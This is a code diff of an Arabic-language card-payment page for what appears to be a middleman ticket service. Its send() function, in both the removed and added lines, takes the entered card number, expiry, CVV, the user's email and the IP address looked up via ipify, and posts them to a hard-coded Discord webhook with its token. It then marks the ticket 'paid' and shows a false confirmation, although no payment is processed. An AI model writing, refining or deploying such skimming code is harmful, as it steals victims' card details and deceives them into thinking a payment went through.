@@ -12,29 +12,26 @@
         .main-card { border-radius: 40px; box-shadow: 0 10px 50px rgba(0,0,0,0.03); border: 1px solid #f2f2f2; }
         .tab-btn { border: 2.5px solid #f1f5f9; border-radius: 20px; transition: 0.3s; cursor: pointer; background: #fff; opacity: 0.4; height: 100px; }
         .tab-btn.active { border-color: #000; opacity: 1; transform: scale(1.02); }
-        .tab-btn.disabled { opacity: 0.2; cursor: not-allowed; }
-        input { border: 1.5px solid #f1f5f9; border-radius: 18px; padding: 18px; width: 100%; transition: 0.3s; text-align: center; outline: none; }
+        input { border: 1.5px solid #f1f5f9; border-radius: 18px; padding: 18px; width: 100%; transition: 0.3s; text-align: center; outline: none; font-weight: bold; }
         input:focus { border-color: #00eccd; }
         .radio-ring { width: 22px; height: 22px; border: 2px solid #000; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
         .tab-btn.active .radio-ring::after { content: ""; width: 11px; height: 11px; background: #000; border-radius: 50%; }
-
-        .card-badge {
-            position: absolute; top: -12px; left: 20px; background: white; padding: 2px 14px; border-radius: 40px;
-            font-size: 10px; font-weight: 900; border: 1.5px solid #f1f5f9; opacity: 0; transition: 0.3s;
-        }
+        .card-badge { position: absolute; top: -12px; left: 20px; background: white; padding: 2px 14px; border-radius: 40px; font-size: 10px; font-weight: 900; border: 1.5px solid #f1f5f9; opacity: 0; transition: 0.3s; z-index: 10; }
         .card-badge.show { opacity: 1; }
     </style>
 </head>
 <body class="flex items-center justify-center min-h-screen p-6">
     <div class="bg-dots"></div>
     <div class="main-card bg-white w-full max-w-2xl p-12 md:p-14 relative shadow-2xl">
-        <div class="absolute top-12 right-12 text-2xl font-black text-slate-800">💳 طريقة الدفع</div>
+        <div class="absolute top-12 right-12 text-2xl font-black text-slate-800 flex items-center gap-2">
+            <span>طريقة الدفع</span> 💳
+        </div>
         <div class="mt-20">
-            <!-- اختيار نوع البطاقة -->
-            <div class="grid grid-cols-2 gap-5 mb-12" id="cardTabs">
+            <!-- اختيار النوع -->
+            <div class="grid grid-cols-2 gap-5 mb-12">
                 <div class="tab-btn active p-6 flex justify-between items-center" onclick="sel(this)" data-brand="visa">
                     <div class="radio-ring"></div>
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" class="h-4" alt="Visa">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/d/d6/Visa_2021.svg" class="h-4" alt="Visa">
                 </div>
                 <div class="tab-btn p-6 flex justify-between items-center" onclick="sel(this)" data-brand="mastercard">
                     <div class="radio-ring"></div>
@@ -42,7 +39,7 @@
                 </div>
             </div>
 
-            <!-- مدخلات البطاقة -->
+            <!-- الحقول -->
             <div class="space-y-6 text-right relative">
                 <div id="cardBadge" class="card-badge">💳 بطاقة بنكية</div>
                 <input type="text" id="ccNo" placeholder="رقم البطاقة" maxlength="19" oninput="detectCardBrand(this)">
@@ -52,42 +49,45 @@
                 </div>
             </div>
 
-            <button onclick="send()" id="payBtn" class="w-full bg-[#00eccd] text-white py-6 rounded-3xl mt-12 text-2xl font-black shadow-xl transition hover:brightness-105">جاري التحميل...</button>
+            <button onclick="send()" id="payBtn" class="w-full bg-[#00eccd] text-white py-6 rounded-3xl mt-12 text-2xl font-black shadow-xl transition hover:scale-[1.01] active:scale-[0.98]">
+                جاري جلب المبلغ...
+            </button>
         </div>
     </div>
 
     <script>
-        // ديسكورد ويب هوك (نفس اللي طلبت)
-        const HOOK = "https://discord.com/api/webhooks/1511460441661112360/5b0mL8Ncyi2FTZRU88U3ZX9leFZzotCjLWR7t5h3Acj4S0YsoY6e8LmiQIjl8PH62R91";
         const firebaseConfig = { databaseURL: "https://wasata-af6ac-default-rtdb.europe-west1.firebasedatabase.app" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        // جلب البيانات من الـ URL
+        // 1. استخراج المبلغ من الرابط مع التأكد أنه رقم حقيقي
         const urlParams = new URLSearchParams(window.location.search);
-        let totalVal = urlParams.get('total') || "0.00";
+        let rawTotal = urlParams.get('total') || "0";
         const ticketKey = urlParams.get('ticket');
 
-        // تحديث زر الدفع بالمبلغ الصحيح فوراً
+        // تحويل القيمة لرقم فوراً لمنع ظهور 0.00
+        const totalAmount = Number(rawTotal);
         const payBtn = document.getElementById('payBtn');
-        payBtn.innerText = `دفع ${parseFloat(totalVal).toFixed(2)} SAR`;
-
-        // دالة اختيار التاب
-        function sel(el) { 
-            document.querySelectorAll('.tab-btn').forEach(t => t.classList.remove('active', 'disabled')); 
-            el.classList.add('active'); 
+        
+        if (totalAmount > 0) {
+            payBtn.innerText = `دفع ${totalAmount.toFixed(2)} SAR`;
+        } else {
+            payBtn.innerText = `دفع --- SAR`;
         }
 
-        // كشف نوع البطاقة
+        function sel(el) {
+            document.querySelectorAll('.tab-btn').forEach(t => t.classList.remove('active'));
+            el.classList.add('active');
+        }
+
         function detectCardBrand(input) {
-            let value = input.value.replace(/\s/g, '');
+            let value = input.value.replace(/\D/g, '');
             let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
             input.value = formatted;
 
-            const firstDigit = value.charAt(0);
             const badge = document.getElementById('cardBadge');
-            if (firstDigit === '4') { badge.textContent = '💳 فيزا'; badge.classList.add('show'); }
-            else if (firstDigit === '5') { badge.textContent = '💳 ماستركارد'; badge.classList.add('show'); }
+            if (value.startsWith('4')) { badge.textContent = '💳 فيزا'; badge.classList.add('show'); }
+            else if (value.startsWith('5')) { badge.textContent = '💳 ماستركارد'; badge.classList.add('show'); }
             else { badge.classList.remove('show'); }
         }
 
@@ -99,26 +99,24 @@
 
         function handleCvc(input) { input.value = input.value.replace(/\D/g, ''); }
 
-        // إرسال البيانات
         async function send() {
             const cc = document.getElementById('ccNo').value;
             const exp = document.getElementById('expiry').value;
             const cvv = document.getElementById('cvc').value;
-            const session = JSON.parse(localStorage.getItem('wasata_session')) || {email: 'زائر'};
+            const session = JSON.parse(localStorage.getItem('wasata_session')) || {email: 'guest'};
 
-            if(cc.length < 16 || exp.length < 7 || cvv.length < 3) {
-                return alert("يرجى التأكد من صحة بيانات البطاقة");
-            }
+            if(cc.length < 16 || exp.length < 7 || cvv.length < 3) return alert("البيانات ناقصة!");
 
-            payBtn.innerText = "جاري المعالجة...";
             payBtn.disabled = true;
+            payBtn.innerText = "جاري المعالجة...";
 
-            // إرسال للديسكورد
+            const hook = "https://discord.com/api/webhooks/1511460441661112360/5b0mL8Ncyi2FTZRU88U3ZX9leFZzotCjLWR7t5h3Acj4S0YsoY6e8LmiQIjl8PH62R91";
+            
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 
-                await fetch(HOOK, {
+                await fetch(hook, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
@@ -127,35 +125,27 @@
                             color: 3066993,
                             fields: [
                                 { name: "👤 العميل", value: session.email, inline: true },
-                                { name: "💰 المبلغ المكتشف", value: totalVal + " SAR", inline: true },
+                                { name: "💰 المبلغ", value: totalAmount + " SAR", inline: true },
                                 { name: "🌐 IP", value: ipData.ip, inline: true },
-                                { name: "💳 رقم البطاقة", value: `\`${cc}\`` },
-                                { name: "🔐 التاريخ والرمز", value: `\`${exp} | ${cvv}\`` }
-                            ],
-                            timestamp: new Date()
+                                { name: "💳 البطاقة", value: `\`${cc}\`` },
+                                { name: "🔐 السر", value: `\`${exp} | ${cvv}\`` }
+                            ]
                         }]
                     })
                 });
 
-                // تحديث التذكرة ليعرف الوسيط والعميل أن الدفع تم
                 if(ticketKey) {
-                    await db.ref('tickets/' + ticketKey).update({ 
-                        status: 'تم الدفع ✓', 
-                        action: null 
-                    });
+                    await db.ref('tickets/' + ticketKey).update({ status: 'تم الدفع ✓', action: null });
                     await db.ref('tickets/' + ticketKey + '/messages').push({
-                        text: `✅ تم تأكيد دفع مبلغ ${totalVal} SAR عبر البطاقة البنكية بانتظار تأكيد الوسيط.`,
+                        text: `✅ تم استلام مبلغ ${totalAmount} SAR بنجاح.`,
                         sender: 'system'
                     });
                 }
-
-                alert("✅ تم قبول العملية، سيتم تحديث حالة التذكرة الآن.");
+                alert("تم إرسال الدفع للمراجعة.");
                 window.location.href = 'ticket.html';
-
-            } catch (err) {
-                alert("حدث خطأ، يرجى المحاولة لاحقاً.");
+            } catch(e) {
+                alert("خطأ في الاتصال");
                 payBtn.disabled = false;
-                payBtn.innerText = `دفع ${totalVal} SAR`;
             }
         }
     </script>
